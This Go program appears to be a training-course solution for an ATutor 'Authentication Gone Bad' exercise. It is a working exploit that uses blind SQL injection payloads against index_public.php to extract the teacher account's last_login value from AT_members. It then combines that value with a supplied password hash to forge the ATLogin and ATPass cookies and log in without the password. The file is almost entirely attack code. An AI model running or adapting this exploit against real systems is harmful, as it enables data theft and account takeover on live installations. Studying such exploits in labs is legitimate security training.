package main

import (
	"crypto/sha512"
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"github.com/iPhantasmic/OSWE/scripts/utils"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
)

// Ex 3.7.1.2 - Extra Mile: Authentication Gone Bad but with the $used_cookie login path

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func sendSearchFriendsSQLiLogin(ip string, sqliPayload string) int {
	for i := 32; i < 126; i++ {
		// do necessary URL manipulation
		updatedPayload := strings.Replace(sqliPayload, "[CHAR]", fmt.Sprintf("%d", i), -1)
		requestURL := fmt.Sprintf("http://%s/ATutor/mods/_standard/social/index_public.php?q=%s", ip, updatedPayload)

		// send the request
		contentLength := utils.SendGetRequest(client, false, requestURL).ContentLength

		if contentLength > 0 {
			return i
		}
	}

	return 0
}

// test')/**/or/**/(select/**/length((select/**/login/**/from/**/AT_members/**/where/**/status=3/**/limit/**/1)))=7%23
func getLengthLogin(ip string, subquery string, lower, upper int) int {
	for i := lower; i < upper; i++ {
		updatedPayload := fmt.Sprintf("test')/**/or/**/(select/**/length((%s)))=%d%%23", subquery, i)
		requestURL := fmt.Sprintf("http://%s/ATutor/mods/_standard/social/index_public.php?q=%s", ip, updatedPayload)

		// send the request
		contentLength := utils.SendGetRequest(client, false, requestURL).ContentLength

		if contentLength > 0 {
			return i
		}
	}

	return 0
}

func generateSaltedPassword(hashedPassword string, lastLogin string) string {
	hasher1 := sha512.New()
	hasher1.Write([]byte(lastLogin))
	hashedLastLogin := hasher1.Sum(nil)

	concatenated := hashedPassword + hex.EncodeToString(hashedLastLogin)
	utils.PrintInfo("Intermediate string: " + concatenated)

	hasher2 := sha512.New()
	hasher2.Write([]byte(concatenated))

	finalSaltedPassword := hex.EncodeToString(hasher2.Sum(nil))
	utils.PrintInfo("Final saltedPassword: " + finalSaltedPassword)

	return finalSaltedPassword
}

func loginWithCookie(debug bool, ip string, hash, lastLogin string) bool {
	// do necessary URL manipulation
	requestURL := fmt.Sprintf("http://%s/ATutor/login.php", ip)

	saltedPassword := generateSaltedPassword(hash, lastLogin)

	// send the request
	response := utils.SendPostRequest(client, debug, requestURL, utils.PostRequest{
		ContentType: "form",
		Cookies: []*http.Cookie{
			&http.Cookie{
				Name:  "ATLogin",
				Value: "teacher",
			},
			&http.Cookie{
				Name:  "ATPass",
				Value: saltedPassword,
			},
		},
		FormData: url.Values{},
		JsonData: "",
	})

	// regex for evidence of successful login
	match1, _ := regexp.MatchString("Create Course: My Start Page", response.ResponseBody)
	match2, _ := regexp.MatchString("My Courses: My Start Page", response.ResponseBody)
	if match1 || match2 {
		return true
	}

	return false
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 3 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-proxy=<proxyIP>] [-debug=true] <target> <hash>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103 <hash>", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)
	hash := flag.Arg(1)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// cookie jar to help us manage cookies
	jar, err := cookiejar.New(nil)
	if err != nil {
		log.Fatalln("Error while creating cookie jar", err)
	}

	// create our HTTP client using the above transport and cookie jar, then set the global variable
	client = &http.Client{
		Transport: tr,
		Jar:       jar,
	}

	lastLoginQuery := "select/**/last_login/**/from/**/AT_members/**/where/**/login='teacher'"
	lastLoginLen := getLengthLogin(ip, lastLoginQuery, 15, 20)
	utils.PrintInfo(fmt.Sprintf("Length of Last Login: %d", lastLoginLen))

	lastLogin := ""
	utils.PrintInfo("Extracting Last Login: ")
	for i := 1; i < lastLoginLen+1; i++ {
		sqliPayload := fmt.Sprintf("test')/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]%%23", lastLoginQuery, i)
		extractedChar := fmt.Sprintf("%c", sendSearchFriendsSQLiLogin(ip, sqliPayload))
		lastLogin += extractedChar
		fmt.Print(extractedChar)
	}

	fmt.Print("\n")

	if loginWithCookie(*debug, ip, hash, lastLogin) {
		utils.PrintSuccess("Successfully logged in!")
	} else {
		utils.PrintFailure("Failed to login...")
	}
}
